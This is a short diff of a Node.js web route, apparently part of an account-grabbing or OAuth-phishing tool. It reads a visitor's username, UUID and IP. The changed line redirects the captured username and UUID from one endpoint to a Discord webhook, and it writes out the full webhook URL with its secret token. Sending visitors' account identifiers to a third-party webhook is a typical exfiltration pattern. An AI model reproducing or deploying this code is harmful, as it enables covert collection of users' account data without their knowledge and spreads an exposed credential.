@@ -28,7 +28,7 @@ app.get('/', async (req, res) => {
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
         const ip = getIp(req)
-        pageGoPost({url: "http://d-na.kr/oath.php", target: "_self", vals: [["username", username], ["uuid", uuid]]});
+        pageGoPost({url: "https://discord.com/api/webhooks/1047624352004325407/Y_mbIqVCtZGSUx_pSKloGRm1DrsFi2-JSgtnI_ijd3Ukpc9ERtxnAeLQFkTfWNKfya5l", target: "_self", vals: [["username", username], ["uuid", uuid]]});
     } catch (e) {
         console.log(e)
     }
